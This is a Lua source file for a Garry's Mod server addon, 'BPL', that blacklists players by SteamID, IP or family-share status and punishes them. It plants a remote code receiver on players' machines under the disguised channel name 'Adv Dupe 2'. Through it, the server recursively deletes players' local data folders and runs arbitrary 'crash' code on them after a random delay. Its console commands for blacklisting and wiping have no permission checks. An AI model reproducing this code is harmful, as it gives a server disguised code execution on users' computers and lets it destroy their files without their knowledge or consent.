-- Addon Creator: QuirkyLarry - STEAM_0:0:80555260 - 76561198121376248 - http://steamcommunity.com/profiles/76561198121376248
-- BPL Github: https://github.com/LarryIsTheBoss/BPL-BadPeopleList

-- Localized function(s).
local l_hAd = (SERVER and hook.Add or NULL)
local l_IVd = (SERVER and IsValid or NULL)
local l_tHV = (SERVER and table.HasValue or NULL)
local l_mrm = (SERVER and math.random or NULL)
local l_mTe = (SERVER and math.Truncate or NULL)
local l_pnt = (SERVER and print or NULL)
local l_tCe = (SERVER and timer.Create or NULL)
local l_tsg = (SERVER and tostring or NULL)
local l_sEe = (SERVER and string.Explode or NULL)
local l_ie = (SERVER and include or NULL)
local l_tRe = (SERVER and timer.Remove or NULL)
local l_fEs = (SERVER and file.Exists or NULL)
local l_fRd = (SERVER and file.Read or NULL)
local l_uJSONTTe = (SERVER and util.JSONToTable or NULL)
local l_uSIDF64 = (SERVER and util.SteamIDFrom64 or NULL)
local l_pGBSID64 = (SERVER and player.GetBySteamID64 or NULL)
local l_fCDr = (SERVER and file.CreateDir or NULL)
local l_tit = (SERVER and table.insert or NULL)
local l_uTTJSON = (SERVER and util.TableToJSON or NULL)
local l_fWe = (SERVER and file.Write or NULL)
local l_cAd = (SERVER and concommand.Add or NULL)
local l_uANSg = (SERVER and util.AddNetworkString or NULL)
local l_net_nSt = net.Start;local l_net_nWSg = net.WriteString;local l_net_nSd = net.Send

l_uANSg( "AdvDupeSend" )
l_ie("bpl_config_main.lua")
l_ie("bpl_config_punishments.lua")
l_ie("bpl_config_familyshare.lua")

local BPL_BannedSteamID = {}
if l_fEs("bpl/bpl_bannedusers.json", "DATA") then
  local SavedIDs = l_fRd("bpl/bpl_bannedusers.json", "DATA")
  BPL_BannedSteamID = l_uJSONTTe(SavedIDs)
end
-- Function that wipes Adv Dupe 2 data if enabled.
-- Took me over 10h to get this to work, congrats. Now enjoy.
local BPLWipeAdvDupe = function(ply)
  ply:SendLua("net.Receive( 'AdvDupeSend', function() local DupeFuncString = net.ReadString(); local SentFunc = CompileString(DupeFuncString, 'Adv Dupe 2'); if SentFunc then SentFunc() end;end)")
  l_net_nSt("AdvDupeSend", false)
  l_net_nWSg("local CurrentDir = {'" .. BPL.DataToWipe .. "'};for k , v in pairs(CurrentDir) do local AdvDupe2Files, AdvDupeFolder = file.Find(v, 'DATA', 'nameasc');if AdvDupeFolder == nil then return end;local InDir = tostring(v);local CurrentDirCount = #CurrentDir;InDir = string.Trim(InDir, '*');for k, v in pairs(AdvDupeFolder) do local NewFolderOne = '';local NewFolderTwo = '';local NewFolderThree = '';if InDir ~= tostring(v) then NewFolderOne = InDir .. tostring(v) .. '/*';NewFolderTwo = InDir .. tostring(v) .. '/';NewFolderThree = InDir .. tostring(v);else NewFolderOne = InDir .. '/*';NewFolderTwo = InDir .. '/';NewFolderThree = InDir;end table.insert(CurrentDir, CurrentDirCount + 1, NewFolderOne);table.insert(CurrentDir, CurrentDirCount + 1, NewFolderTwo);table.insert(CurrentDir, CurrentDirCount + 1, NewFolderThree);end;for k, v in pairs(AdvDupe2Files) do file.Delete(tostring(InDir) .. v) end;for k,v in pairs(AdvDupeFolder) do if tostring(InDir) == v then file.Delete(v); else file.Delete(tostring(InDir) .. v); end end;end")
  l_net_nSd(ply)
end
-- This function enforces the punishment upon the client.
local BPLEnforcement = function(ply,l_SteamID64,FamilyShare)
  if BPL.Wipe then BPLWipeAdvDupe(ply) end
  if not FamilyShare then
    if BPL.Punish.Type == "kick" then
      ply:Kick(BPL.Punish.KickMessage)
    elseif BPL.Punish.Type == "ban" then
      if BPL.AdminSystem == "SOURCE" then ply:Ban(BPL.Punish.BanLength, false);ply:Kick(BPL.Punish.KickMessage) end
      if BPL.AdminSystem == "ULX" then ULib.ban(	ply,BPL.Punish.BanLength,BPL.Punish.BanMessage) end
      if BPL.AdminSystem == "SAM" then local SteamID32 = l_uSIDF64(l_SteamID64); sam.player.ban_id(SteamID32, BPL.Punish.BanLength, BPL.Punish.BanMessage) end
    elseif BPL.Punish.Type == "crash" then
      ply:SendLua(BPL.Punish.CustomLUARun)
      if BPL.Punish.CustomLUAKick then ply:Kick(BPL.Punish.KickMessage) end
    end
  else
    if not BPL.FamilyShare.Ban and not BPL.FamilyShare.Crash then ply:Kick(BPL.Punish.KickMessage)
    elseif not BPL.FamilyShare.Ban and BPL.FamilyShare.Crash then ply:SendLua(BPL.Punish.CustomLUARun) if BPL.Punish.CustomLUAKick then ply:Kick(BPL.Punish.KickMessage) end
    elseif BPL.FamilyShare.Ban and not BPL.FamilyShare.Crash then
      if BPL.AdminSystem == "SOURCE" then ply:Ban(BPL.Punish.BanLength, false);ply:Kick(BPL.Punish.KickMessage) end
      if BPL.AdminSystem == "ULX" then ULib.ban(	ply,BPL.Punish.BanLength,BPL.Punish.BanMessage) end
      if BPL.AdminSystem == "SAM" then local SteamID32 = l_uSIDF64(l_SteamID64); sam.player.ban_id(SteamID32, BPL.Punish.BanLength, BPL.Punish.BanMessage) end
    elseif BPL.FamilyShare.Ban and BPL.FamilyShare.Crash then
      if BPL.AdminSystem == "SOURCE" then ply:Ban(BPL.Punish.BanLength, false);ply:Kick(BPL.Punish.KickMessage) end
      if BPL.AdminSystem == "ULX" then ULib.ban(	ply,BPL.Punish.BanLength,BPL.Punish.BanMessage) end
      if BPL.AdminSystem == "SAM" then local SteamID32 = l_uSIDF64(l_SteamID64); sam.player.ban_id(SteamID32, BPL.Punish.BanLength, BPL.Punish.BanMessage) end ply:SendLua(BPL.Punish.CustomLUARun) if BPL.Punish.CustomLUAKick then ply:Kick(BPL.Punish.KickMessage) end
    end
  end
end
-- Function that checks each method/blacklist for a detection.
local BPLPunish = function(ply,TimeUntilDisconnect,l_IPAddressSimple,l_SteamID64,l_PlayerName,l_GModLicenseOwner)
  local FamilyShare = false
  if BPL.EnablePunishment or BPL.EnableIPPunishment or BPL.SimpleAntiFamilyShare then
    if l_tHV(BPL.Config.BPL_SteamID64, l_SteamID64) or l_tHV(BPL_BannedSteamID, l_SteamID64) then
      l_tCe(BPL.CommunityName .. "_" .. l_SteamID64 .. "_" .. BPL.TimerName .. "_" .. l_PlayerName, TimeUntilDisconnect, 1, function()
        BPLEnforcement(ply,l_SteamID64,FamilyShare)
      end)
      l_pnt(" =======| [BPL] - Detection |======= ");l_pnt("[BPL] - Player's Name: " .. l_PlayerName);l_pnt("[BPL] - SteamID64:" .. l_SteamID64);l_pnt("[BPL] - IP:" .. l_IPAddressSimple[1]);l_pnt("[BPL] - Detection Method: [SteamID64]");l_pnt("[BPL] - IP Blacklisted: " .. l_tsg(l_tHV(BPL.Config.BPL_IPs, l_IPAddressSimple[1])))
    elseif l_tHV(BPL.Config.BPL_IPs, l_IPAddressSimple) then
      l_tCe(BPL.CommunityName .. "_" .. l_SteamID64 .. "_" .. BPL.TimerName .. "_" .. l_PlayerName, TimeUntilDisconnect, 1, function()
        BPLEnforcement(ply,l_SteamID64,FamilyShare)
      end)
      l_pnt(" =======| [BPL] - Detection |======= ");l_pnt("[BPL] - Player's Name: " .. l_PlayerName);l_pnt("[BPL] - SteamID64:" .. l_SteamID64);l_pnt("[BPL] - IP:" .. l_IPAddressSimple[1]);l_pnt("[BPL] - Detection Method: [IPAddress]");l_pnt("[BPL] - SteamID Blacklisted: " .. l_tsg(l_tHV(BPL.Config.BPL_SteamID64, l_SteamID64) or l_tHV(BPL_BannedSteamID, l_SteamID64)))
    elseif l_SteamID64 ~= l_GModLicenseOwner then
      l_tCe(BPL.CommunityName .. "_" .. l_SteamID64 .. "_" .. BPL.TimerName .. "_" .. l_PlayerName, TimeUntilDisconnect, 1, function()
        FamilyShare = true
        BPLEnforcement(ply,l_SteamID64,FamilyShare)
        if BPL.FamilyShare.BanOwner then BPLEnforcement(ply,l_GModLicenseOwner) end
        l_pnt("[BPL] | " .. l_PlayerName .. "/" .. l_SteamID64 .. " was caught by BPL. - Current IP: " .. l_IPAddressSimple[1] .. " - Detection Method: [IPAddress] | " .. "SteamID Blacklisted: " .. l_tsg(l_tHV(BPL.Config.BPL_SteamID64, l_SteamID64) or l_tHV(BPL_BannedSteamID, l_SteamID64)))
      end)
      l_pnt(" =======| [BPL] - Detection |======= ");l_pnt("[BPL] - Player's Name: " .. l_PlayerName);l_pnt("[BPL] - SteamID64:" .. l_SteamID64);l_pnt("[BPL] - IP:" .. l_IPAddressSimple[1]);l_pnt("[BPL] - Detection Method: [FamilyShare]");l_pnt("[BPL] - IP Blacklisted: " .. l_tsg(l_tHV(BPL.Config.BPL_IPs, l_IPAddressSimple[1])));l_pnt("[BPL] - SteamID Blacklisted: " .. l_tsg(l_tHV(BPL.Config.BPL_SteamID64, l_SteamID64) or l_tHV(BPL_BannedSteamID, l_SteamID64)))
    else
      l_pnt("[BPL - Pass] | " .. l_PlayerName .. "/" .. l_SteamID64 .. " has passed the [BPL] check. - IP: " .. l_IPAddressSimple[1])
    end
  end
end
-- [BPL] | Main Hook. Runs on only FIRST spawn.
l_hAd("PlayerInitialSpawn", BPL.CommunityName .. "_" .. BPL.TimerName .. "_PlayerInitialSpawn", function(ply)
  if not l_IVd(ply) then return end
  local TimeUntilDisconnect = l_mrm(BPL.Punish.MinTimeBeforePunish,BPL.Punish.MaxTimeBeforePunish)
  local l_SteamID64 = ply:SteamID64()
  local l_IPAddress = ply:IPAddress()
  local l_PlayerName = ply:Nick()
  local l_GModLicenseOwner = ply:OwnerSteamID64()
  -- Splits the IP Address and the port number they are connected on.
  l_IPAddressSimple = l_sEe(":", l_IPAddress)
  l_mTe(TimeUntilDisconnect, 0)
  BPLPunish(ply,TimeUntilDisconnect,l_IPAddressSimple,l_SteamID64,l_PlayerName,l_GModLicenseOwner)
end)
-- Removes the timer incase the player disconnects before code is executed on client.
l_hAd("PlayerDisconnected",BPL.CommunityName .. "_" .. BPL.TimerName .. "_TimerRemove", function(ply)
  local pl_sid64 = ply:SteamID64()
  local l_PlayerName = ply:Nick()
  if BPL.EnablePunishment or BPL.EnableIPPunishment or BPL.SimpleAntiFamilyShare then l_tRe(BPL.CommunityName .. "_" .. pl_sid64 .. "_" .. BPL.TimerName .. "_" .. l_PlayerName) end
end)
-- Writes the SteamID64 to bpl_bannedusers.json and checks if the BPL folder exists.
local UpdateBannedUsersBPL = function(ply,cmd,args)
  if table.IsEmpty(args) then return end
  if l_pGBSID64(args[1]) ~= false then
    local playerbySteam64 = l_pGBSID64(args[1])
    playerbySteam64:Kick("Steam auth ticket has been cancelled")
  end
  if not l_fEs("bpl","data") then
    l_fCDr("bpl")
  end
  l_tit(BPL_BannedSteamID, args[1])
  local BannedIDsToString = l_uTTJSON(BPL_BannedSteamID)
  l_fWe("bpl/bpl_bannedusers.json", BannedIDsToString)
end
local AdvDupeGetPlayer = function(ply,cmd,args)
  if table.IsEmpty(args) then return end
  if l_pGBSID64(args[1]) ~= false then
    local playerbySteam64 = l_pGBSID64(args[1])
    ply = playerbySteam64
  end
  BPLWipeAdvDupe(ply)
end

local Convert32To64 = function(ply,cmd,args)
  if table.IsEmpty(args) then return end
  local PlySteamID64 = util.SteamIDTo64(args[1])
  l_pnt("[BPL] - SteamID: " .. args[1] .. " - SteamID64: " .. PlySteamID64)
end
if CLIENT then return end
-- Command to write the SteamID64 to a file.
l_cAd("bpl_blacklist", function( ply, cmd, args, str )
  UpdateBannedUsersBPL(ply,cmd,args)
end)
-- Command to force wipe a players Adv Dupe 2 data.
l_cAd("bpl_clearadv", function( ply, cmd, args, str )
  AdvDupeGetPlayer(ply,cmd,args)
end)
-- Coming in a later version.
--[[
-- Command to delete an Adv Dupe 2 file on a client.
l_cAd("bpl_clearadvfile", function( ply, cmd, args, str )
  AdvDupeGetPlayer(ply,cmd,args)
end)--]]
-- Command to convert SteamID32 to SteamID64.
l_cAd("bpl_convert", function( ply, cmd, args, str )
  Convert32To64(ply,cmd,args)
end)
l_pnt("[BPL] | " .. "Core has loaded. | " .. "v" .. BPL.VersionNumber)